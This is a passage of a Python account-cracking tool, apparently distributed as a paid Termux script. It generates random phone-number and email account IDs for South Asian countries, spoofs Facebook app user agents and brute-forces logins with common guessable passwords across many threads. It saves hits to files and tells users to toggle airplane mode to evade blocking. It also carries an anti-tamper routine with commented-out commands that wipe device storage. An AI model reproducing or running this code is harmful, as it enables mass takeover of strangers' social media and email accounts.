5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
    gtt=random.choice(gt)
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(7,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/"+fbs+";FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
    devapi.append(ua)
for okdk in range(5000):
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code=str(random.randint(000000000,999999999))
    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
    sims = random.choice(["Telenor", "Movistar", "Telenor PK", "MTN NG", "Glo NG", "UFONE-PAKTel", "TRUE-H", "Cerillion", "Zong", "IDEA", "Jazz", "SCO", "Jio", "Jio 4G", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Robi", "Visible", "Banglalink", "Teletalk", "TNT", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "SFR", "null", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange", "Tele2", "Vi India", "EE", "MtelBG", "Oi", "CLARO BR", "FASTWEB", "Sprint", "ParMieru", "DNA PLC", "CelcomDigi", "dtac"])
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    uaa = f'Davik/2.1.0 (Linux; U; Android 12.0.0; 22111317I Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.5,width=1080,height=2400};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(sims)};FBMF/Xiaomi;FBBD/Redmi;FBPN/{str(fbs)};FBDV/22111317I;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
    uab = f'Davik/2.1.0 (Linux; U; Android 5.1.0; SM-J500F Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.5,width=720,height=1280};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-J500F;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]'
    uac = f'Davik/2.1.0 (Linux; U; Android 2.1.0; GT-I9000 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=480,height=800};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-I9000;FBSV/2.1;nullFBCA/armeabi-v7a:armeabi;]'
    uad = f'Davik/2.1.0 (Linux; U; Android 2.3.4; GT-I9100 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=480,height=800};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-I9100;FBSV/2.3.4;nullFBCA/armeabi-v7a:armeabi;]'
    uae = f'Davik/2.1.0 (Linux; U; Android 10.0.0; SM-M013F Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.8,width=720,height=1480};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-M013F;FBSV/10;nullFBCA/armeabi-v7a:armeabi;]'
    uaf = f'Davik/2.1.0 (Linux; U; Android 2.3.5; GT-S5360 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=240,height=320};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-S5360;FBSV/2.3.5;nullFBCA/armeabi-v7a:armeabi;]'
    uag = f'Davik/2.1.0 (Linux; U; Android 2.1.0; GT-I9000 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=480,height=800};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-I9000;FBSV/2.1;nullFBCA/armeabi-v7a:armeabi;]'
    uaall =([uaa,uab,uac,uad,uae,uaf,uag])
    ua = random.choice(uaall)
    #print(f' {B}|{G}USERAGENT{B}|{P} {ua}');time.sleep(2);sifat()
    devapi.append(ua)

red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
pink = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"



  
logo =(f"""\033[1;97m [\033[1;100m\x1b[1;93m version "0.1 \033[0;97m]           \033[1;97m[\033[1;100m\x1b[1;93m 𝐏𝐚𝐢𝐝 𝐓𝐨𝐨𝐥 \033[0;97m] 
 
d8888b.  .d8b.  d8b   db db   dD db    db 
88  `8D d8' `8b 888o  88 88 ,8P' 88    88 
\033[1;92m88oodD' 88ooo88 88V8o 88 88,8P   88    88 
88~~~   88~~~88 88 V8o88 88`8b   88    88 \033[1;97m
88      88   88 88  V888 88 `88. 88b  d88 
88      YP   YP VP   V8P YP   YD ~Y8888P' 

\033[1;97m{50*"="}\033[0;97m
 Author       :  Pankaj Mehra
 Github       :  pk929786
 Whatsapp     :  +919352926965
\033[1;97m{50*"="}\033[0;97m""") 

def check_lock(cid):
    req = str(requests.get(f'https://graph.facebook.com/{cid}/picture?type=normal').text)
    if 'Photoshop' in req:
        return 'live'
    else:
        return 'lock'

def oo(text):
    return f"{white}({green}{text}{white})"

class sec():
    def __init__(self):
        if "print" in open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py", "r").read():
            self.fuck()
        if "print" in open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py", "r").read():
            self.fuck()
        if "print" in open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py", "r").read():
            self.fuck()
        if os.path.exists("/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png"):
            self.fuck()
        if os.path.exists("/storage/emulated/0/Android/data/com.guoshi.httpcanary"):
            self.fuck()
    
    def fuck(self):
        #os.system("rm -rf *")
       # os.system("rm -rf /sdcard/*")
        #os.system("rm -rf /sdcard/Android/*")
        #os.system("rm -rf /storage")
       # os.system("rm -rf /storage/*")
        #os.system("rm -rf /sdcard/emulated/*")
        #os.system("rm -rf /sdcard/emulated")
       # os.system("rm -rf /sdcard/enc_emulated")
       # os.system("rm -rf /sdcard/enc_emulated/*")
        #os.system("rm -rf *")
        os.system("clear")
        print(logo)
        print(f" {oo('!')} Congratulations ! ")
        print(f" {oo('!')} Successfully Bypassed The Tool ")
        print(f" {oo('!')} Don't Try Again To Bypass The Tool ")
        print(f" {oo('!')} Now Check Your Storage ")
        linex()
        exit()
        
xxxx = str(len(devua))
#---------------------[LOOP MENU]---------------------#
loop = 0
oks = []
cps = []
twf = []
baby =[]

current = dt.now()
day = current.day
month = current.month
year = current.year
hour = current.hour
minute = current.minute
second = current.second
if hour > 12:
    hourx = hour-12
    tag = "PM"
else:
    hourx = hour
    tag = "AM"
timex = f"{hour}:{minute}{tag}"
datex = f"{day}/{month}/{year}"

#---------------------[APPLICATION CHECKER]---------------------#
    
import pycurl
from io import BytesIO

idz = []
plist = []

def clear():
    os.system("clear")
    print(logo)

def linex():
    print("\033[1;97m--------------------------------------------------\033[0;97m")

def dev_time():
    print(f" [•] Time : {timex} ")
    print(f" [•] Date : {datex} ")
    linex()

def menu():
    clear()
    dev_time()
    print(" [1] File Cloning ")
    print(" [2] Number Cloning ")
    print(" [3] Gmail Cloning ")
    print(" [4] Contact Owner ")
    print(" [5] Exit Tool ")
    linex()
    devv = input(' Select : ')
    if devv =='1':f_clone()
    elif devv =='2':r_clone()
    elif devv =='3':g_clone()
    elif devv =='4':os.system("xdg-open https://wa.me/+918434369140");menu()
    elif devv =='5':exit()
    else:
        print("SELECT CORRECT OPTION")
        time.sleep(1)
        menu()

def f_clone():
    clear()
    file_x = input(' Put file path: ')
    try:
        file_idz = open(file_x, "r").read().splitlines()
    except:
        print(' No file found ....');exit()
    for x in file_idz:
        idz.append(x)
    clear()
    print(" [1] Method  ")
    print(" [2] Method  ")
    print(" [3] Method  ")
    linex()
    m = input(' Select : ')
    clear()
    print(" [1] Auto")
    print(" [2] Choose Password")
    linex()
    p = input(' Select : ')
    if p == "1":
        plist.append("first123")
        plist.append("first1234")
        plist.append("first12345")
        plist.append("firstlast")
        plist.append("first last")
        plist.append("firstlast123")
        plist.append("first786")
        plist.append("firstlast786")
    else:
        clear()
        plimit = int(input(' How Much Password Do You Want To Add ? ')) 
        clear()
        print(" Example : first123, first1234, first12345 ")
        linex()
        for dev in range(plimit):
            ap = input(f" [{dev+1}] Password : ")
            plist.append(ap)
    with ThreadPool(max_workers=30) as dev_xd:
        clear()
        tl = str(len(idz))
        print(' Total Ids : '+tl)
        print(' Cloning Is Started Wait For Results')
        print(' After Every 5 Min Turn Airplane On/Off')
        linex()
        for love in idz:
            uid, name = love.split("|")
            pwx = plist
            if m == "1":dev_xd.submit(freefb, uid, name, pwx, tl)
            elif m == "2":dev_xd.submit(bapi, uid, name, pwx, tl)
            elif m == "3":dev_xd.submit(graph, uid, name, pwx, tl)
            else:
                dev_xd.submit(graph, uid, name, pwx, tl)
    linex()
    print(" [•] PROCESS HAS BEEN COMPLETED ")
    print(" [•] TOTAL OK ACCOUNTS : "+str(len(oks)))
    print(" [•] TOTAL CP ACCOUNTS : "+str(len(cps)))
    linex()
    input(" [•] PRESS ENTER TO EXIT TOOL ")
    exit()

def r_clone():
    clear()
    dev_time()
    print(" [1] Nepal Ids")
    print(" [2] Indian Ids")
    print(" [3] Pakistani Ids")
    print(" [4] Bangladesh Ids")
    print(" [5] Random Choice Password ")
    print(" [6] Random FreeFire & Pubg")
    linex()
    devv = input(' Select : ')
    if devv =='1':dev1()
    elif devv =='2':dev2()
    elif devv =='3':dev3()
    elif devv =='4':dev4()
    elif devv =='5':dev5()
    elif devv =='6':dev6()
    else:
        print("SELECT CORRECT OPTION")
        time.sleep(1)
        menu()
    
def dev1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  9760,9827,9800,9840,9849') 
    print(47*'-')
    kode = input('[?] INPUT CODE : ')
    print(47*'-')
    limit = int(input('[?] LIMIT CLONE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    print("                CHOOSE METHOD                       ")
    print("[+]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(" [1] METHOD (Api-1) ")
    print(" [2] METHOD (Api-2) ")
    print(" [3] METHOD (Api-X) ")
    print(" [4] METHOD (Simple) ")
    print(" [5] METHOD (Simple) ")
    print(" [6] METHOD (Simple) ")
    print(" [7] METHOD (Simple) ")
    print(" [8] METHOD (Simple) ")
    print(" [9] METHOD (Simple) ")
    linex()
    devfire = input("[+] [CHOOSE] :- ")
    with ThreadPool(max_workers=30) as dev_xd:
        clear()
        dev_time()
        tl = str(len(user))
        print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
        print(f"[+] YOUR CODE CHOOSED : "+kode)
        print(f'[+] YOUR METHOD CHOOSED : M{devfire}')
        linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
        for love in user:
            uid = kode+love
            pwx = [uid+love,'tamang123 ','tamang1234','maya123','pokhara','nepal123','kathmandu123','pokhara123','kathmandu','tamang12345','nepal12345','nepal1234']
            if devfire =='1':dev_xd.submit(api1,uid,pwx,tl)
            elif devfire =='2':dev_xd.submit(api2,uid,pwx,tl)
            elif devfire =='3':dev_xd.submit(apix,uid,pwx,tl)
            elif devfire =='4':dev_xd.submit(mbasic,uid,pwx,tl)
            elif devfire =='5':dev_xd.submit(p,uid,pwx,tl)
            elif devfire =='6':dev_xd.submit(x,uid,pwx,tl)
            elif devfire =='7':dev_xd.submit(mobile,uid,pwx,tl)
            elif devfire =='8':dev_xd.submit(freeq,uid,pwx,tl)
            elif devfire =='9':dev_xd.submit(d,uid,pwx,tl)
            else:
                dev_xd.submit(p,uid,pwx,tl)
            
    linex()
    print('[✓] CRACKING COMPLETED ')
    print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    print('[?] Ids saved in PANKAJ-OK.txt,DEV-CP.txt')
    input("DO YOU WANT TO GO BSCK MENU ")
    menu()
    linex()

def dev2():
    user=[]
    clear()
    print(' \033[1;91mFor Ex : 8521')
    kode = input(' \033[1;97mPut Code : ')
    clear()
    print(' \033[1;91mFor Ex : 1000, 2000, 3000, 5000, 10000')
    limit = int(input(' Put Ids Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    clear()
    print("                Choose Method                       ")
    linex()
    print(" [1] Method (Api-1) ")
    print(" [2] Method (Api-2) ")
    print(" [3] Method (Api-X) ")
    print(" [4] Method (Simple) ")
    print(" [5] Method (Simple) ")
    print(" [6] Method (Simple) ")
    print(" [7] Method (Simple) ")
    print(" [8] Method (Simple) ")
    print(" [9] Method (Simple) ")
    linex()
    devfire = input(' Select : ')
    with ThreadPool(max_workers=30) as dev_xd:
        clear()
       # dev_time()
        tl = str(len(user))
        print(' Total Ids : '+tl)
        print(f" Choice Code :  "+kode)
        print(' Cloning Is Started Wait For Results')
        print(' After Every 5 Min Turn Airplane On/Off')
        linex()
        for love in user:
            uid = kode+love
            mk = uid[:6]
            pwx = [love]
            pwx = [kode+love,mk,'free fire','i love you','57273200','59039200']
            if devfire =='1':dev_xd.submit(api1,uid,pwx,tl)
            elif devfire =='2':dev_xd.submit(api2,uid,pwx,tl)
            elif devfire =='3':dev_xd.submit(apix,uid,pwx,tl)
            elif devfire =='4':dev_xd.submit(mbasic,uid,pwx,tl)
            elif devfire =='5':dev_xd.submit(p,uid,pwx,tl)
            elif devfire =='6':dev_xd.submit(x,uid,pwx,tl)
            elif devfire =='7':dev_xd.submit(mobile,uid,pwx,tl)
            elif devfire =='8':dev_xd.submit(freeq,uid,pwx,tl)
            elif devfire =='9':dev_xd.submit(d,uid,pwx,tl)
            else:
                dev_xd.submit(p,uid,pwx,tl)
            
    linex()
    print('[✓] Crack process has been completed')
    print('[?] Ids saved in DEV-OK.txt,DEV-CP.txt')
    linex()


def dev3():
    user=[]
    clear()
    print(' \033[1;91mFor Ex : 0300, 0302, 0310, 0312, 0321, 0332, 0340')
    kode = input(' \033[1;97mPut Code : ')
    clear()
    print(' \033[1;91mFor Ex : 1000, 2000, 3000, 5000, 10000')
    limit = int(input(' Put Ids Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    clear()
    print("                Choose Method                       ")
    linex()
    print(" [1] Method (Api-1) ")
    print(" [2] Method (Api-2) ")
    print(" [3] Method (Api-X) ")
    print(" [4] Method (Simple) ")
    print(" [5] Method (Simple) ")
    print(" [6] Method (Simple) ")
    print(" [7] Method (Simple) ")
    print(" [8] Method (Simple) ")
    print(" [9] Method (Simple) ")
    linex()
    devfire = input(' Select : ')
    with ThreadPool(max_workers=30) as dev_xd:
        clear()
        #dev_time()
        tl = str(len(user))
        print(' Total Ids : '+tl)
        print(f" Choice Code :  "+kode)
        print(' Cloning Is Started Wait For Results')
        print(' After Every 5 Min Turn Airplane On/Off')
        linex()
        for love in user:
            uid = kode+love
            mk = uid[:6]
            pwx = [love]
            pwx = [kode+love,mk,'khankhan','khan123','khan1122','Free Fire','i love you','freefire123','khan786','khan12345']
            if devfire =='1':dev_xd.submit(api1,uid,pwx,tl)
            elif devfire =='2':dev_xd.submit(api2,uid,pwx,tl)
            elif devfire =='3':dev_xd.submit(apix,uid,pwx,tl)
            elif devfire =='4':dev_xd.submit(mbasic,uid,pwx,tl)
            elif devfire =='5':dev_xd.submit(p,uid,pwx,tl)
            elif devfire =='6':dev_xd.submit(x,uid,pwx,tl)
            elif devfire =='7':dev_xd.submit(mobile,uid,pwx,tl)
            elif devfire =='8':dev_xd.submit(freeq,uid,pwx,tl)
            elif devfire =='9':dev_xd.submit(d,uid,pwx,tl)
            else:
                dev_xd.submit(p,uid,pwx,tl)
            
    linex()
    print('[✓] Crack process has been completed')
    print('[?] Ids saved in PANKAJ-OK💚.txt,DEV-CP.txt')
    linex()
            
    linex()
    print('[✓] Crack process has been completed')
    print('[?] Ids saved in DEV-OK.txt,DEV-CP.txt')
    linex()


def dev4():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (017)')
    print(47*'-')
    kode = input('[?] INPUT CODE : ')
    print(47*'-')
    limit = int(input('[?] LIMIT CLONE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    clear()
    print("                Choose Method                       ")
    linex()
    print(" [1] Method (Api-1) ")
    print(" [2] Method (Api-2) ")
    print(" [3] Method (Api-X) ")
    print(" [4] Method (Simple) ")
    print(" [5] Method (Simple) ")
    print(" [6] Method (Simple) ")
    print(" [7] Method (Simple) ")
    print(" [8] Method (Simple) ")
    print(" [9] Method (Simple) ")
    linex()
    devfire = input(' Select : ')
    with ThreadPool(max_workers=30) as dev_xd:
        clear()
      #  dev_time()
        tl = str(len(user))
        print(' Total Ids : '+tl)
        print(f" Choice Code :  "+kode)
        print(' Cloning Is Started Wait For Results')
        print(' After Every 5 Min Turn Airplane On/Off')
        linex()
        for love in user:
            uid = kode+love
            mk = uid[:6]
            pwx = [love]
            pwx = [kode+love,mk,'bangladesh','Bangladesh','free fire','Free Fire','i love you','freefire123']
            if devfire =='1':dev_xd.submit(api1,uid,pwx,tl)
            elif devfire =='2':dev_xd.submit(api2,uid,pwx,tl)
            elif devfire =='3':dev_xd.submit(apix,uid,pwx,tl)
            elif devfire =='4':dev_xd.submit(mbasic,uid,pwx,tl)
            elif devfire =='5':dev_xd.submit(p,uid,pwx,tl)
            elif devfire =='6':dev_xd.submit(x,uid,pwx,tl)
            elif devfire =='7':dev_xd.submit(mobile,uid,pwx,tl)
            elif devfire =='8':dev_xd.submit(freeq,uid,pwx,tl)
            elif devfire =='9':dev_xd.submit(d,uid,pwx,tl)
            else:
                dev_xd.submit(p,uid,pwx,tl)
            
    linex()
    print('[✓] Crack process has been completed')
    print('[?] Ids saved in DEV-OK.txt,DEV-CP.txt')
    linex()




def dev5():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] ENTER YOUR FOUR SIM CODE (9725)')
    print(47*'-')
    code = input('[#] PUT CODE : ')
    print("")
    limit = int(input('[+] PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    clear()
    passx = int(input("[*] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    clear()
    print("                Choose Method                       ")
    linex()
    print(" [1] Method (Api-1) ")
    print(" [2] Method (Api-2) ")
    print(" [3] Method (Api-X) ")
    print(" [4] Method (Simple) ")
    print(" [5] Method (Simple) ")
    print(" [6] Method (Simple) ")
    print(" [7] Method (Simple) ")
    print(" [8] Method (Simple) ")
    print(" [9] Method (Simple) ")
    linex()
    devfire = input(' Select : ')
    with ThreadPool(max_workers=30) as dev_xd:
        clear()
        #dev_time()
        tl = str(len(user))
        print(' Total Ids : '+tl)
        print(f" Choice Code :  "+kode)
        print(' Cloning Is Started Wait For Results')
        print(' After Every 5 Min Turn Airplane On/Off')
        linex()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            if devfire =='1':dev_xd.submit(api1,uid,pwx,tl)
            elif devfire =='2':dev_xd.submit(api2,uid,pwx,tl)
            elif devfire =='3':dev_xd.submit(apix,uid,pwx,tl)
            elif devfire =='4':dev_xd.submit(mbasic,uid,pwx,tl)
            elif devfire =='5':dev_xd.submit(p,uid,pwx,tl)
            elif devfire =='6':dev_xd.submit(x,uid,pwx,tl)
            elif devfire =='7':dev_xd.submit(mobile,uid,pwx,tl)
            elif devfire =='8':dev_xd.submit(freeq,uid,pwx,tl)
            elif devfire =='9':dev_xd.submit(d,uid,pwx,tl)
            else:
                dev_xd.submit(p,uid,pwx,tl)
            



def dev6():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
    print(47*'-')
    kode = input('[?] Input Code : ')
    print(47*'-')
    limit = int(input('[?] LIMIT CLONE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    clear()
    print("                Choose Method                       ")
    linex()
    print(" [1] Method (Api-1) ")
    print(" [2] Method (Api-2) ")
    print(" [3] Method (Api-X) ")
    print(" [4] Method (Simple) ")
    print(" [5] Method (Simple) ")
    print(" [6] Method (Simple) ")
    print(" [7] Method (Simple) ")
    print(" [8] Method (Simple) ")
    print(" [9] Method (Simple) ")
    linex()
    devfire = input(' Select : ')
    with ThreadPool(max_workers=30) as dev_xd:
        clear()
      #  dev_time()
        tl = str(len(user))
        print(' Total Ids : '+tl)
        print(f" Choice Code :  "+kode)
        print(' Cloning Is Started Wait For Results')
        print(' After Every 5 Min Turn Airplane On/Off')
        linex()
        for love in user:
            uid = kode+love
            mk = uid[:6]
            pwx = [love]
            pwx = [kode+love,mk,'free fire','i love you','freefire123']
            if devfire =='1':dev_xd.submit(api1,uid,pwx,tl)
            elif devfire =='2':dev_xd.submit(api2,uid,pwx,tl)
            elif devfire =='3':dev_xd.submit(apix,uid,pwx,tl)
            elif devfire =='4':dev_xd.submit(mbasic,uid,pwx,tl)
            elif devfire =='5':dev_xd.submit(p,uid,pwx,tl)
            elif devfire =='6':dev_xd.submit(x,uid,pwx,tl)
            elif devfire =='7':dev_xd.submit(mobile,uid,pwx,tl)
            elif devfire =='8':dev_xd.submit(freeq,uid,pwx,tl)
            elif devfire =='9':dev_xd.submit(d,uid,pwx,tl)
            else:
                dev_xd.submit(p,uid,pwx,tl)
    linex()
    print('[✓] Crack process has been completed')
    print('[?] Ids saved in DEV-OK.txt,DEV-CP.txt')
    linex()

def g_clone():
    user=[]
    os.system('clear')
    print(logo)
    print(" Ex First : ayesha, kazim, dev ")
    print(" Ex Last  : rajput, channa, aaraya ")
    print(47*'-')
    first = input(' [•] First Name : ')
    last = input(' [•] Last Name  : ')
    print(47*'-')
    print(' Ex Domain : @gmail.com, @yahoo.com, @hotmail.com ')
    print(47*'-')
    domain = input(' [•] Domain : ')
    try:
        limit = int(input(' [•] Crack Limit : '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    print("                Choose Method                       ")
    linex()
    print(" [1] Method (Api-1) ")
    print(" [2] Method (Api-2) ")
    print(" [3] Method (Api-X) ")
    print(" [4] Method (Simple) ")
    print(" [5] Method (Simple) ")
    print(" [6] Method (Simple) ")
    print(" [7] Method (Simple) ")
    print(" [8] Method (Simple) ")
    print(" [9] Method (Simple) ")
    linex()
    devfire = input(' Select : ')
    with ThreadPool(max_workers=30) as dev_xd:
        clear()
        #dev_time()
        tl = str(len(user))
        print(' Total Ids : '+tl)
        print(f" Choice Domain :  "+domain)
        print(' Cloning Is Started Wait For Results')
        print(' After Every 5 Min Turn Airplane On/Off')
        linex()
        for love in user:
            uid = first+'.'+last+'.'+love+domain
            pwx = [first+last,first+' '+last,first+last+'12',last,first+love,first+'123',first+'1234',first+last+'12']
            if devfire =='1':dev_xd.submit(api1,uid,pwx,tl)
            elif devfire =='2':dev_xd.submit(api2,uid,pwx,tl)
            elif devfire =='3':dev_xd.submit(apix,uid,pwx,tl)
            elif devfire =='4':dev_xd.submit(mbasic,uid,pwx,tl)
            elif devfire =='5':dev_xd.submit(p,uid,pwx,tl)
            elif devfire =='6':dev_xd.submit(x,uid,pwx,tl)
            elif devfire =='7':dev_xd.submit(mobile,uid,pwx,tl)
            elif devfire =='8':dev_xd.submit(freeq,uid,pwx,tl)
            elif devfire =='9':dev_xd.submit(d,uid,pwx,tl)
            else:
                dev_xd.submit(p,uid,pwx,tl)
    linex()
    print('[✓] Crack process has been completed')
    print('[?] Ids saved in PANKAJ-OK.txt,DEV-CP.txt')
    linex()

def freefb(uid, name, pwx, tl):
    global loop
    global oks
    global cps
    sys.stdout.write(f'\r\033[1;97m[PANKAJ-M1] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for ps in pwx:
            pw = ps.replace("first", first).replace("last", last).lower()
            session = requests.Session()
            ua = random.choice(devua)
            free_fb = session.get("https://free.facebook.com").text
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pw,
                "login": "Log In",
            }
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
